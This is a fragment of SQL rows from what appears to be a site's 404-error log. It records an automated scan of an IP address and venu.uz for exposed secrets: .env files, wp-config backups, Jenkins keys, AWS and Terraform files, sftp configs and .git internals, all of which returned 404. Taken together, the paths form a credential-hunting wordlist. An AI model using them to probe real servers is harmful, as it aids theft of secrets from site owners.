(188,404,'https://95.182.118.148/src/setupTests.js',1,NULL,NULL,'2025-06-24 22:31:17','2025-06-24 22:31:17'),
(189,404,'https://95.182.118.148/src/constants.js',1,NULL,NULL,'2025-06-24 22:31:17','2025-06-24 22:31:17'),
(190,404,'https://95.182.118.148/src/settings.js',1,NULL,NULL,'2025-06-24 22:31:18','2025-06-24 22:31:18'),
(191,404,'https://95.182.118.148/config-overrides.js',1,NULL,NULL,'2025-06-24 22:31:18','2025-06-24 22:31:18'),
(192,404,'https://95.182.118.148/vue.config.js',1,NULL,NULL,'2025-06-24 22:31:18','2025-06-24 22:31:18'),
(193,404,'https://95.182.118.148/src/env.js',1,NULL,NULL,'2025-06-24 22:31:19','2025-06-24 22:31:19'),
(194,404,'https://95.182.118.148/src/config/index.js',1,NULL,NULL,'2025-06-24 22:31:19','2025-06-24 22:31:19'),
(195,404,'https://95.182.118.148/config/test.json',1,NULL,NULL,'2025-06-24 22:31:19','2025-06-24 22:31:19'),
(196,404,'https://95.182.118.148/settings.js',1,NULL,NULL,'2025-06-24 22:31:20','2025-06-24 22:31:20'),
(197,404,'https://95.182.118.148/config/packages/prod.yaml',1,NULL,NULL,'2025-06-24 22:31:20','2025-06-24 22:31:20'),
(198,404,'https://95.182.118.148/config/packages/dev.yaml',1,NULL,NULL,'2025-06-24 22:31:26','2025-06-24 22:31:26'),
(199,404,'https://95.182.118.148/config/packages/test.yaml',1,NULL,NULL,'2025-06-24 22:31:26','2025-06-24 22:31:26'),
(200,404,'https://95.182.118.148/config/routes.yaml',1,NULL,NULL,'2025-06-24 22:31:31','2025-06-24 22:31:31'),
(201,404,'https://95.182.118.148/config/packages/security.yaml',1,NULL,NULL,'2025-06-24 22:31:31','2025-06-24 22:31:31'),
(202,404,'https://95.182.118.148/config/packages/doctrine.yaml',1,NULL,NULL,'2025-06-24 22:31:32','2025-06-24 22:31:32'),
(203,404,'https://95.182.118.148/config/packages/twig.yaml',1,NULL,NULL,'2025-06-24 22:31:37','2025-06-24 22:31:37'),
(204,404,'https://95.182.118.148/config/packages/framework.yaml',1,NULL,NULL,'2025-06-24 22:31:37','2025-06-24 22:31:37'),
(205,404,'https://95.182.118.148/config/packages/cache.yaml',1,NULL,NULL,'2025-06-24 22:31:38','2025-06-24 22:31:38'),
(206,404,'https://95.182.118.148/appsettings.Staging.json',1,NULL,NULL,'2025-06-24 22:31:38','2025-06-24 22:31:38'),
(207,404,'https://95.182.118.148/hosting.json',1,NULL,NULL,'2025-06-24 22:31:39','2025-06-24 22:31:39'),
(208,404,'https://95.182.118.148/config/env/development.js',1,NULL,NULL,'2025-06-24 22:31:39','2025-06-24 22:31:39'),
(209,404,'https://95.182.118.148/config/env/production.js',1,NULL,NULL,'2025-06-24 22:31:39','2025-06-24 22:31:39'),
(210,404,'https://95.182.118.148/config/env/test.js',1,NULL,NULL,'2025-06-24 22:31:40','2025-06-24 22:31:40'),
(211,404,'https://95.182.118.148/config/bootstrap.js',1,NULL,NULL,'2025-06-24 22:31:45','2025-06-24 22:31:45'),
(212,404,'https://95.182.118.148/config/models.js',1,NULL,NULL,'2025-06-24 22:31:50','2025-06-24 22:31:50'),
(213,404,'https://95.182.118.148/config/policies.js',1,NULL,NULL,'2025-06-24 22:31:50','2025-06-24 22:31:50'),
(214,404,'https://95.182.118.148/config/routes.js',1,NULL,NULL,'2025-06-24 22:31:51','2025-06-24 22:31:51'),
(215,404,'https://95.182.118.148/config/session.js',1,NULL,NULL,'2025-06-24 22:31:51','2025-06-24 22:31:51'),
(216,404,'https://95.182.118.148/config/sockets.js',1,NULL,NULL,'2025-06-24 22:31:51','2025-06-24 22:31:51'),
(217,404,'https://95.182.118.148/config/views.js',1,NULL,NULL,'2025-06-24 22:31:52','2025-06-24 22:31:52'),
(218,404,'https://95.182.118.148/conf/application.conf',1,NULL,NULL,'2025-06-24 22:31:57','2025-06-24 22:31:57'),
(219,404,'https://95.182.118.148/conf/routes',1,NULL,NULL,'2025-06-24 22:31:57','2025-06-24 22:31:57'),
(220,404,'https://95.182.118.148/conf/logback.xml',1,NULL,NULL,'2025-06-24 22:31:58','2025-06-24 22:31:58'),
(221,404,'https://95.182.118.148/conf/messages',1,NULL,NULL,'2025-06-24 22:32:03','2025-06-24 22:32:03'),
(222,404,'https://95.182.118.148/conf/play.plugins',1,NULL,NULL,'2025-06-24 22:32:03','2025-06-24 22:32:03'),
(223,404,'https://95.182.118.148/conf/application-dev.conf',1,NULL,NULL,'2025-06-24 22:32:04','2025-06-24 22:32:04'),
(224,404,'https://95.182.118.148/conf/application-prod.conf',1,NULL,NULL,'2025-06-24 22:32:09','2025-06-24 22:32:09'),
(225,404,'https://95.182.118.148/conf/application-test.conf',1,NULL,NULL,'2025-06-24 22:32:09','2025-06-24 22:32:09'),
(226,404,'https://95.182.118.148/conf/dev-application.conf',1,NULL,NULL,'2025-06-24 22:32:09','2025-06-24 22:32:09'),
(227,404,'https://95.182.118.148/conf/prod-application.conf',1,NULL,NULL,'2025-06-24 22:32:10','2025-06-24 22:32:10'),
(228,404,'https://95.182.118.148/config/settings.json',1,NULL,NULL,'2025-06-24 22:32:10','2025-06-24 22:32:10'),
(229,404,'https://95.182.118.148/config/env.json',1,NULL,NULL,'2025-06-24 22:32:10','2025-06-24 22:32:10'),
(230,404,'https://95.182.118.148/meteor.settings.json',1,NULL,NULL,'2025-06-24 22:32:11','2025-06-24 22:32:11'),
(231,404,'https://95.182.118.148/server/config.js',1,NULL,NULL,'2025-06-24 22:32:11','2025-06-24 22:32:11'),
(232,404,'https://95.182.118.148/server/env.js',1,NULL,NULL,'2025-06-24 22:32:16','2025-06-24 22:32:16'),
(233,404,'https://95.182.118.148/client/config.js',1,NULL,NULL,'2025-06-24 22:32:16','2025-06-24 22:32:16'),
(234,404,'https://95.182.118.148/config/keys.js',1,NULL,NULL,'2025-06-24 22:32:17','2025-06-24 22:32:17'),
(235,404,'https://95.182.118.148/config/db.js',1,NULL,NULL,'2025-06-24 22:32:18','2025-06-24 22:32:18'),
(236,404,'https://95.182.118.148/config/env.js',1,NULL,NULL,'2025-06-24 22:32:23','2025-06-24 22:32:23'),
(237,404,'https://95.182.118.148/local_settings.py',1,NULL,NULL,'2025-06-24 22:32:23','2025-06-24 22:32:23'),
(238,404,'https://95.182.118.148/config/database.py',1,NULL,NULL,'2025-06-24 22:32:28','2025-06-24 22:32:28'),
(239,404,'https://95.182.118.148/config/email.py',1,NULL,NULL,'2025-06-24 22:32:28','2025-06-24 22:32:28'),
(240,404,'https://95.182.118.148/config/secrets.json',1,NULL,NULL,'2025-06-24 22:32:29','2025-06-24 22:32:29'),
(241,404,'https://95.182.118.148/config/initializers/secret_token.rb',1,NULL,NULL,'2025-06-24 22:32:29','2025-06-24 22:32:29'),
(242,404,'https://95.182.118.148/config/initializers/session_store.rb',1,NULL,NULL,'2025-06-24 22:32:29','2025-06-24 22:32:29'),
(243,404,'https://95.182.118.148/config/credentials.yml.enc',1,NULL,NULL,'2025-06-24 22:32:30','2025-06-24 22:32:30'),
(244,404,'https://95.182.118.148/config/application-dev.properties',1,NULL,NULL,'2025-06-24 22:32:30','2025-06-24 22:32:30'),
(245,404,'https://95.182.118.148/config/application-prod.properties',1,NULL,NULL,'2025-06-24 22:32:34','2025-06-24 22:32:34'),
(246,404,'https://95.182.118.148/config/application-test.properties',1,NULL,NULL,'2025-06-24 22:32:35','2025-06-24 22:32:35'),
(247,404,'https://95.182.118.148/src/main/resources/database.properties',1,NULL,NULL,'2025-06-24 22:32:39','2025-06-24 22:32:39'),
(248,404,'https://95.182.118.148/src/main/resources/security.properties',1,NULL,NULL,'2025-06-24 22:32:40','2025-06-24 22:32:40'),
(249,404,'https://95.182.118.148/Properties/launchSettings.json',1,NULL,NULL,'2025-06-24 22:32:40','2025-06-24 22:32:40'),
(250,404,'https://95.182.118.148/appsettings.QA.json',1,NULL,NULL,'2025-06-24 22:32:41','2025-06-24 22:32:41'),
(251,404,'https://95.182.118.148/appsettings.Local.json',1,NULL,NULL,'2025-06-24 22:32:41','2025-06-24 22:32:41'),
(252,404,'https://95.182.118.148/src/environments/environment.staging.ts',1,NULL,NULL,'2025-06-24 22:32:41','2025-06-24 22:32:41'),
(253,404,'https://95.182.118.148/src/config/app.config.ts',1,NULL,NULL,'2025-06-24 22:32:46','2025-06-24 22:32:46'),
(254,404,'https://95.182.118.148/src/config/config.json',1,NULL,NULL,'2025-06-24 22:32:46','2025-06-24 22:32:46'),
(255,404,'https://95.182.118.148/src/config/environment.json',1,NULL,NULL,'2025-06-24 22:32:46','2025-06-24 22:32:46'),
(256,404,'https://95.182.118.148/src/config/settings.ts',1,NULL,NULL,'2025-06-24 22:32:47','2025-06-24 22:32:47'),
(257,404,'https://95.182.118.148/src/config/config.ts',1,NULL,NULL,'2025-06-24 22:32:47','2025-06-24 22:32:47'),
(258,404,'https://95.182.118.148/src/settings.json',1,NULL,NULL,'2025-06-24 22:32:48','2025-06-24 22:32:48'),
(259,404,'https://95.182.118.148/src/config/settings.js',1,NULL,NULL,'2025-06-24 22:32:48','2025-06-24 22:32:48'),
(260,404,'https://95.182.118.148/src/config/configuration.js',1,NULL,NULL,'2025-06-24 22:32:48','2025-06-24 22:32:48'),
(261,404,'https://95.182.118.148/config/development.py',1,NULL,NULL,'2025-06-24 22:32:49','2025-06-24 22:32:49'),
(262,404,'https://95.182.118.148/config/production.py',1,NULL,NULL,'2025-06-24 22:32:49','2025-06-24 22:32:49'),
(263,404,'https://95.182.118.148/config/test.py',1,NULL,NULL,'2025-06-24 22:32:50','2025-06-24 22:32:50'),
(264,404,'https://95.182.118.148/config/secrets.py',1,NULL,NULL,'2025-06-24 22:32:50','2025-06-24 22:32:50'),
(265,404,'https://95.182.118.148/config/packages/prod/doctrine.yaml',1,NULL,NULL,'2025-06-24 22:32:51','2025-06-24 22:32:51'),
(266,404,'https://95.182.118.148/config/packages/dev/twig.yaml',1,NULL,NULL,'2025-06-24 22:32:51','2025-06-24 22:32:51'),
(267,404,'https://95.182.118.148/config/packages/test/security.yaml',1,NULL,NULL,'2025-06-24 22:32:52','2025-06-24 22:32:52'),
(268,404,'https://95.182.118.148/config/routes/dev/twig.yaml',1,NULL,NULL,'2025-06-24 22:32:56','2025-06-24 22:32:56'),
(269,404,'https://95.182.118.148/config/dev.env.js',1,NULL,NULL,'2025-06-24 22:32:56','2025-06-24 22:32:56'),
(270,404,'https://95.182.118.148/config/prod.env.js',1,NULL,NULL,'2025-06-24 22:33:01','2025-06-24 22:33:01'),
(271,404,'https://95.182.118.148/config/test.env.js',1,NULL,NULL,'2025-06-24 22:33:01','2025-06-24 22:33:01'),
(272,404,'https://95.182.118.148/config/staging.env.js',1,NULL,NULL,'2025-06-24 22:33:01','2025-06-24 22:33:01'),
(273,404,'https://95.182.118.148/src/configuration.js',1,NULL,NULL,'2025-06-24 22:33:05','2025-06-24 22:33:05'),
(274,404,'https://95.182.118.148/config/environment.json',1,NULL,NULL,'2025-06-24 22:33:05','2025-06-24 22:33:05'),
(275,404,'https://95.182.118.148/private/config.json',1,NULL,NULL,'2025-06-24 22:33:06','2025-06-24 22:33:06'),
(276,404,'https://95.182.118.148/private/env.json',1,NULL,NULL,'2025-06-24 22:33:10','2025-06-24 22:33:10'),
(277,404,'https://95.182.118.148/server/settings.js',1,NULL,NULL,'2025-06-24 22:33:10','2025-06-24 22:33:10'),
(278,404,'https://95.182.118.148/server/environment.js',1,NULL,NULL,'2025-06-24 22:33:11','2025-06-24 22:33:11'),
(279,404,'https://95.182.118.148/gatsby-config.js',1,NULL,NULL,'2025-06-24 22:33:16','2025-06-24 22:33:16'),
(280,404,'https://95.182.118.148/gatsby-node.js',1,NULL,NULL,'2025-06-24 22:33:17','2025-06-24 22:33:17'),
(281,404,'https://95.182.118.148/gatsby-browser.js',1,NULL,NULL,'2025-06-24 22:33:17','2025-06-24 22:33:17'),
(282,404,'https://95.182.118.148/gatsby-ssr.js',1,NULL,NULL,'2025-06-24 22:33:17','2025-06-24 22:33:17'),
(283,404,'https://95.182.118.148/config/settings.js',1,NULL,NULL,'2025-06-24 22:33:18','2025-06-24 22:33:18'),
(284,404,'https://95.182.118.148/config/environment.js',1,NULL,NULL,'2025-06-24 22:33:22','2025-06-24 22:33:22'),
(285,404,'https://95.182.118.148/config/local.js',1,NULL,NULL,'2025-06-24 22:33:22','2025-06-24 22:33:22'),
(286,404,'https://95.182.118.148/config/connections.js',1,NULL,NULL,'2025-06-24 22:33:22','2025-06-24 22:33:22'),
(287,404,'https://95.182.118.148/config/routes.rb',1,NULL,NULL,'2025-06-24 22:33:23','2025-06-24 22:33:23'),
(288,404,'https://95.182.118.148/config/config.go',1,NULL,NULL,'2025-06-24 22:33:23','2025-06-24 22:33:23'),
(289,404,'https://95.182.118.148/config/dev.json',1,NULL,NULL,'2025-06-24 22:33:27','2025-06-24 22:33:27'),
(290,404,'https://95.182.118.148/config/prod.json',1,NULL,NULL,'2025-06-24 22:33:27','2025-06-24 22:33:27'),
(291,404,'https://95.182.118.148/config/staging.json',1,NULL,NULL,'2025-06-24 22:33:28','2025-06-24 22:33:28'),
(292,404,'https://95.182.118.148/config/local.json',1,NULL,NULL,'2025-06-24 22:33:28','2025-06-24 22:33:28'),
(293,404,'https://95.182.118.148/config/database.go',1,NULL,NULL,'2025-06-24 22:33:28','2025-06-24 22:33:28'),
(294,404,'https://95.182.118.148/config/env.go',1,NULL,NULL,'2025-06-24 22:33:29','2025-06-24 22:33:29'),
(295,404,'https://95.182.118.148/config/kubeconfig.yaml',1,NULL,NULL,'2025-06-24 22:33:29','2025-06-24 22:33:29'),
(296,404,'https://95.182.118.148/config/deployment.yaml',1,NULL,NULL,'2025-06-24 22:33:30','2025-06-24 22:33:30'),
(297,404,'https://95.182.118.148/config/service.yaml',1,NULL,NULL,'2025-06-24 22:33:30','2025-06-24 22:33:30'),
(298,404,'https://95.182.118.148/config/secret.yaml',1,NULL,NULL,'2025-06-24 22:33:30','2025-06-24 22:33:30'),
(299,404,'https://95.182.118.148/config/configmap.yaml',1,NULL,NULL,'2025-06-24 22:33:34','2025-06-24 22:33:34'),
(300,404,'https://95.182.118.148/config/pod.yaml',1,NULL,NULL,'2025-06-24 22:33:34','2025-06-24 22:33:34'),
(301,404,'https://95.182.118.148/config/namespace.yaml',1,NULL,NULL,'2025-06-24 22:33:38','2025-06-24 22:33:38'),
(302,404,'https://95.182.118.148/config/role.yaml',1,NULL,NULL,'2025-06-24 22:33:38','2025-06-24 22:33:38'),
(303,404,'https://95.182.118.148/config/rolebinding.yaml',1,NULL,NULL,'2025-06-24 22:33:39','2025-06-24 22:33:39'),
(304,404,'https://95.182.118.148/config/ingress.yaml',1,NULL,NULL,'2025-06-24 22:33:39','2025-06-24 22:33:39'),
(305,404,'https://95.182.118.148/conf/development.conf',1,NULL,NULL,'2025-06-24 22:33:39','2025-06-24 22:33:39'),
(306,404,'https://95.182.118.148/conf/production.conf',1,NULL,NULL,'2025-06-24 22:33:40','2025-06-24 22:33:40'),
(307,404,'https://95.182.118.148/conf/test.conf',1,NULL,NULL,'2025-06-24 22:33:43','2025-06-24 22:33:43'),
(308,404,'https://95.182.118.148/conf/application.json',1,NULL,NULL,'2025-06-24 22:33:43','2025-06-24 22:33:43'),
(309,404,'https://95.182.118.148/conf/application.properties',1,NULL,NULL,'2025-06-24 22:33:44','2025-06-24 22:33:44'),
(310,404,'https://95.182.118.148/conf/application.yaml',1,NULL,NULL,'2025-06-24 22:33:44','2025-06-24 22:33:44'),
(311,404,'https://95.182.118.148/app/code/local.xml',1,NULL,NULL,'2025-06-24 22:33:46','2025-06-24 22:33:46'),
(312,404,'https://95.182.118.148/app/code/core.xml',1,NULL,NULL,'2025-06-24 22:33:46','2025-06-24 22:33:46'),
(313,404,'https://95.182.118.148/app/etc/local.xml',1,NULL,NULL,'2025-06-24 22:33:46','2025-06-24 22:33:46'),
(314,404,'https://95.182.118.148/app/etc/config/local.xml',1,NULL,NULL,'2025-06-24 22:33:47','2025-06-24 22:33:47'),
(315,404,'https://95.182.118.148/app/etc/config/core.xml',1,NULL,NULL,'2025-06-24 22:33:47','2025-06-24 22:33:47'),
(316,404,'https://95.182.118.148/app/etc/settings.xml',1,NULL,NULL,'2025-06-24 22:33:48','2025-06-24 22:33:48'),
(317,404,'https://95.182.118.148/terraform.tfvars',1,NULL,NULL,'2025-06-24 22:33:48','2025-06-24 22:33:48'),
(318,404,'https://95.182.118.148/terraform.tfstate',1,NULL,NULL,'2025-06-24 22:33:48','2025-06-24 22:33:48'),
(319,404,'https://95.182.118.148/backend.tf',1,NULL,NULL,'2025-06-24 22:33:49','2025-06-24 22:33:49'),
(320,404,'https://95.182.118.148/provider.tf',1,NULL,NULL,'2025-06-24 22:33:52','2025-06-24 22:33:52'),
(321,404,'https://95.182.118.148/variables.tf',1,NULL,NULL,'2025-06-24 22:33:52','2025-06-24 22:33:52'),
(322,404,'https://95.182.118.148/outputs.tf',1,NULL,NULL,'2025-06-24 22:33:53','2025-06-24 22:33:53'),
(323,404,'https://95.182.118.148/main.tf',1,NULL,NULL,'2025-06-24 22:33:53','2025-06-24 22:33:53'),
(324,404,'https://95.182.118.148/modules',1,NULL,NULL,'2025-06-24 22:33:54','2025-06-24 22:33:54'),
(325,404,'https://95.182.118.148/environments/dev',1,NULL,NULL,'2025-06-24 22:33:54','2025-06-24 22:33:54'),
(326,404,'https://95.182.118.148/environments/prod',1,NULL,NULL,'2025-06-24 22:33:54','2025-06-24 22:33:54'),
(327,404,'https://95.182.118.148/ansible.cfg',1,NULL,NULL,'2025-06-24 22:33:55','2025-06-24 22:33:55'),
(328,404,'https://95.182.118.148/inventory/hosts',1,NULL,NULL,'2025-06-24 22:33:55','2025-06-24 22:33:55'),
(329,404,'https://95.182.118.148/group_vars/all',1,NULL,NULL,'2025-06-24 22:33:56','2025-06-24 22:33:56'),
(330,404,'https://95.182.118.148/host_vars/local',1,NULL,NULL,'2025-06-24 22:33:56','2025-06-24 22:33:56'),
(331,404,'https://95.182.118.148/roles/common/tasks/main.yml',1,NULL,NULL,'2025-06-24 22:33:56','2025-06-24 22:33:56'),
(332,404,'https://95.182.118.148/roles/web/tasks/main.yml',1,NULL,NULL,'2025-06-24 22:33:57','2025-06-24 22:33:57'),
(333,404,'https://95.182.118.148/roles/db/tasks/main.yml',1,NULL,NULL,'2025-06-24 22:33:57','2025-06-24 22:33:57'),
(334,404,'https://95.182.118.148/playbooks/site.yml',1,NULL,NULL,'2025-06-24 22:33:57','2025-06-24 22:33:57'),
(335,404,'https://95.182.118.148/playbooks/web.yml',1,NULL,NULL,'2025-06-24 22:33:58','2025-06-24 22:33:58'),
(336,404,'https://95.182.118.148/playbooks/db.yml',1,NULL,NULL,'2025-06-24 22:33:58','2025-06-24 22:33:58'),
(337,404,'https://95.182.118.148/jenkins/config.xml',1,NULL,NULL,'2025-06-24 22:33:58','2025-06-24 22:33:58'),
(338,404,'https://95.182.118.148/secrets/credentials.xml',1,NULL,NULL,'2025-06-24 22:33:59','2025-06-24 22:33:59'),
(339,404,'https://95.182.118.148/jenkins/secrets/master.key',1,NULL,NULL,'2025-06-24 22:33:59','2025-06-24 22:33:59'),
(340,404,'https://95.182.118.148/jenkins/secrets/hudson.util.Secret',1,NULL,NULL,'2025-06-24 22:34:00','2025-06-24 22:34:00'),
(341,404,'https://95.182.118.148/jobs/config.xml',1,NULL,NULL,'2025-06-24 22:34:00','2025-06-24 22:34:00'),
(342,404,'https://95.182.118.148/pipeline/config.xml',1,NULL,NULL,'2025-06-24 22:34:00','2025-06-24 22:34:00'),
(343,404,'https://95.182.118.148/pipeline/jobs/config.xml',1,NULL,NULL,'2025-06-24 22:34:01','2025-06-24 22:34:01'),
(344,404,'https://95.182.118.148/secrets/initialAdminPassword',1,NULL,NULL,'2025-06-24 22:34:01','2025-06-24 22:34:01'),
(345,404,'https://95.182.118.148/secrets/master.key',1,NULL,NULL,'2025-06-24 22:34:02','2025-06-24 22:34:02'),
(346,404,'https://95.182.118.148/secrets/jenkins.util.Secret',1,NULL,NULL,'2025-06-24 22:34:02','2025-06-24 22:34:02'),
(347,404,'https://95.182.118.148/etc/puppetlabs/puppet/puppet.conf',1,NULL,NULL,'2025-06-24 22:34:02','2025-06-24 22:34:02'),
(348,404,'https://95.182.118.148/etc/puppetlabs/code/environments/production/manifests/site.pp',1,NULL,NULL,'2025-06-24 22:34:03','2025-06-24 22:34:03'),
(349,404,'https://95.182.118.148/etc/puppetlabs/code/environments/development/manifests/site.pp',1,NULL,NULL,'2025-06-24 22:34:03','2025-06-24 22:34:03'),
(350,404,'https://95.182.118.148/etc/puppetlabs/code/hiera.yaml',1,NULL,NULL,'2025-06-24 22:34:03','2025-06-24 22:34:03'),
(351,404,'https://95.182.118.148/etc/puppetlabs/code/modules',1,NULL,NULL,'2025-06-24 22:34:04','2025-06-24 22:34:04'),
(352,404,'https://95.182.118.148/etc/puppetlabs/puppet/ssl',1,NULL,NULL,'2025-06-24 22:34:04','2025-06-24 22:34:04'),
(353,404,'https://95.182.118.148/etc/puppetlabs/puppet/auth.conf',1,NULL,NULL,'2025-06-24 22:34:04','2025-06-24 22:34:04'),
(354,404,'https://95.182.118.148/etc/puppetlabs/puppet/routes.yaml',1,NULL,NULL,'2025-06-24 22:34:05','2025-06-24 22:34:05'),
(355,404,'https://95.182.118.148/etc/puppetlabs/puppet/environment.conf',1,NULL,NULL,'2025-06-24 22:34:05','2025-06-24 22:34:05'),
(356,404,'https://95.182.118.148/etc/puppetlabs/code/modules/apache/manifests/init.pp',1,NULL,NULL,'2025-06-24 22:34:06','2025-06-24 22:34:06'),
(357,404,'https://95.182.118.148/etc/chef/client.rb',1,NULL,NULL,'2025-06-24 22:34:06','2025-06-24 22:34:06'),
(358,404,'https://95.182.118.148/etc/chef/solo.rb',1,NULL,NULL,'2025-06-24 22:34:06','2025-06-24 22:34:06'),
(359,404,'https://95.182.118.148/etc/chef/knife.rb',1,NULL,NULL,'2025-06-24 22:34:07','2025-06-24 22:34:07'),
(360,404,'https://95.182.118.148/etc/chef/encrypted_data_bag_secret',1,NULL,NULL,'2025-06-24 22:34:07','2025-06-24 22:34:07'),
(361,404,'https://95.182.118.148/cookbooks',1,NULL,NULL,'2025-06-24 22:34:07','2025-06-24 22:34:07'),
(362,404,'https://95.182.118.148/data_bags',1,NULL,NULL,'2025-06-24 22:34:08','2025-06-24 22:34:08'),
(363,404,'https://95.182.118.148/roles',1,NULL,NULL,'2025-06-24 22:34:08','2025-06-24 22:34:08'),
(364,404,'https://95.182.118.148/environments',1,NULL,NULL,'2025-06-24 22:34:09','2025-06-24 22:34:09'),
(365,404,'https://95.182.118.148/nodes',1,NULL,NULL,'2025-06-24 22:34:09','2025-06-24 22:34:09'),
(366,404,'https://95.182.118.148/policies',1,NULL,NULL,'2025-06-24 22:34:09','2025-06-24 22:34:09'),
(367,404,'https://95.182.118.148/docker-compose.yml',1,NULL,NULL,'2025-06-24 22:34:10','2025-06-24 22:34:10'),
(368,404,'https://95.182.118.148/.docker/config.json',1,NULL,NULL,'2025-06-24 22:34:10','2025-06-24 22:34:10'),
(369,404,'https://95.182.118.148/config/daemon.json',1,NULL,NULL,'2025-06-24 22:34:10','2025-06-24 22:34:10'),
(370,404,'https://95.182.118.148/config/dockerfile',1,NULL,NULL,'2025-06-24 22:34:11','2025-06-24 22:34:11'),
(371,404,'https://95.182.118.148/config/compose-file',1,NULL,NULL,'2025-06-24 22:34:11','2025-06-24 22:34:11'),
(372,404,'https://95.182.118.148/config/docker-compose.override.yml',1,NULL,NULL,'2025-06-24 22:34:12','2025-06-24 22:34:12'),
(373,404,'https://95.182.118.148/config/docker-compose.prod.yml',1,NULL,NULL,'2025-06-24 22:34:14','2025-06-24 22:34:14'),
(374,404,'https://95.182.118.148/config/docker-compose.dev.yml',1,NULL,NULL,'2025-06-24 22:34:15','2025-06-24 22:34:15'),
(375,404,'https://95.182.118.148/next.config.js',1,NULL,NULL,'2025-06-24 22:34:15','2025-06-24 22:34:15'),
(376,404,'https://95.182.118.148/nuxt.config.js',1,NULL,NULL,'2025-06-24 22:34:15','2025-06-24 22:34:15'),
(377,404,'https://95.182.118.148/src/main.js',1,NULL,NULL,'2025-06-24 22:34:16','2025-06-24 22:34:16'),
(378,404,'https://95.182.118.148/config/secrets.js',1,NULL,NULL,'2025-06-24 22:34:16','2025-06-24 22:34:16'),
(379,404,'https://95.182.118.148/config/configuration.js',1,NULL,NULL,'2025-06-24 22:34:16','2025-06-24 22:34:16'),
(380,404,'https://95.182.118.148/config/deploy.js',1,NULL,NULL,'2025-06-24 22:34:17','2025-06-24 22:34:17'),
(381,404,'https://95.182.118.148/config/development.js',1,NULL,NULL,'2025-06-24 22:34:17','2025-06-24 22:34:17'),
(382,404,'https://95.182.118.148/config/production.js',1,NULL,NULL,'2025-06-24 22:34:18','2025-06-24 22:34:18'),
(383,404,'https://95.182.118.148/config/test.js',1,NULL,NULL,'2025-06-24 22:34:18','2025-06-24 22:34:18'),
(384,404,'https://95.182.118.148/.remote',1,NULL,NULL,'2025-06-24 22:34:18','2025-06-24 22:34:18'),
(385,404,'https://95.182.118.148/.local',1,NULL,NULL,'2025-06-24 22:34:19','2025-06-24 22:34:19'),
(386,404,'https://95.182.118.148/.production',1,NULL,NULL,'2025-06-24 22:34:21','2025-06-24 22:34:21'),
(387,404,'https://95.182.118.148/sendgrid.env',2,NULL,NULL,'2025-06-24 22:34:22','2025-06-24 22:34:37'),
(388,404,'https://95.182.118.148/gists/cache',1,NULL,NULL,'2025-06-24 22:34:22','2025-06-24 22:34:22'),
(389,404,'https://95.182.118.148/phpinfo.php3',1,NULL,NULL,'2025-06-24 22:34:23','2025-06-24 22:34:23'),
(390,404,'https://95.182.118.148/phpinfo.php4',1,NULL,NULL,'2025-06-24 22:34:24','2025-06-24 22:34:24'),
(391,404,'https://95.182.118.148/phpinfo.php5',1,NULL,NULL,'2025-06-24 22:34:24','2025-06-24 22:34:24'),
(392,404,'https://95.182.118.148/live_env',1,NULL,NULL,'2025-06-24 22:34:25','2025-06-24 22:34:25'),
(393,404,'https://95.182.118.148/aws.yml',1,NULL,NULL,'2025-06-24 22:34:25','2025-06-24 22:34:25'),
(394,404,'https://95.182.118.148/config/aws.yml',1,NULL,NULL,'2025-06-24 22:34:26','2025-06-24 22:34:26'),
(395,404,'https://95.182.118.148/symfony/_profiler/phpinfo',1,NULL,NULL,'2025-06-24 22:34:26','2025-06-24 22:34:26'),
(396,404,'https://95.182.118.148/.aws/config',1,NULL,NULL,'2025-06-24 22:34:33','2025-06-24 22:34:33'),
(397,404,'https://95.182.118.148/helpers/utility.js',1,NULL,NULL,'2025-06-24 22:34:33','2025-06-24 22:34:33'),
(398,404,'https://95.182.118.148/wp-config.php.bak',1,NULL,NULL,'2025-06-24 22:34:33','2025-06-24 22:34:33'),
(399,404,'https://95.182.118.148/.wp-config.php.swp',1,NULL,NULL,'2025-06-24 22:34:34','2025-06-24 22:34:34'),
(400,404,'https://95.182.118.148/wp-config.php.old',1,NULL,NULL,'2025-06-24 22:34:34','2025-06-24 22:34:34'),
(401,404,'https://95.182.118.148/.vscode/sftp.json',1,NULL,NULL,'2025-06-24 22:34:35','2025-06-24 22:34:35'),
(402,404,'https://95.182.118.148/.vscode/settings.json',1,NULL,NULL,'2025-06-24 22:34:35','2025-06-24 22:34:35'),
(403,404,'https://95.182.118.148/.ssh/sftp-config.json',1,NULL,NULL,'2025-06-24 22:34:35','2025-06-24 22:34:35'),
(404,404,'https://95.182.118.148/sftp-config.json',1,NULL,NULL,'2025-06-24 22:34:36','2025-06-24 22:34:36'),
(405,404,'https://95.182.118.148/sftp.json',1,NULL,NULL,'2025-06-24 22:34:36','2025-06-24 22:34:36'),
(406,404,'https://95.182.118.148/prevlaravel/sftp-config.json',1,NULL,NULL,'2025-06-24 22:34:36','2025-06-24 22:34:36'),
(407,404,'https://venu.uz/.git/hooks/post-commit.sample',6,NULL,NULL,'2025-06-25 01:28:31','2025-07-12 09:03:14'),
(408,404,'https://venu.uz/.git/hooks/post-receive.sample',6,NULL,NULL,'2025-06-25 01:28:31','2025-07-12 09:03:14'),
(409,404,'https://venu.uz/.git/ORIG_HEAD',5,NULL,NULL,'2025-06-25 01:28:50','2025-07-07 10:32:17'),
(410,404,'https://venu.uz/.git/logs/refs/heads/development',3,NULL,NULL,'2025-06-25 01:28:50','2025-07-12 09:03:16'),
(411,404,'https://venu.uz/.git/logs/refs/remotes/origin/production',3,NULL,NULL,'2025-06-25 01:28:50','2025-07-12 09:03:15'),
(412,404,'https://venu.uz/.git/logs/refs/remotes/origin/development',3,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:17'),
(413,404,'https://venu.uz/.git/logs/refs/remotes/origin/master',6,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:15'),
(414,404,'https://venu.uz/.git/logs/refs/heads/production',3,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:15'),
(415,404,'https://venu.uz/.git/logs/refs/stash',6,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:16'),
(416,404,'https://venu.uz/.git/logs/refs/heads/staging',3,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:16'),
(417,404,'https://venu.uz/.git/logs/refs/remotes/origin/staging',3,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:15'),
(418,404,'https://venu.uz/.git/logs/refs/remotes/origin/HEAD',6,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:16'),
(419,404,'https://venu.uz/.git/refs/remotes/origin/master',6,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:17'),
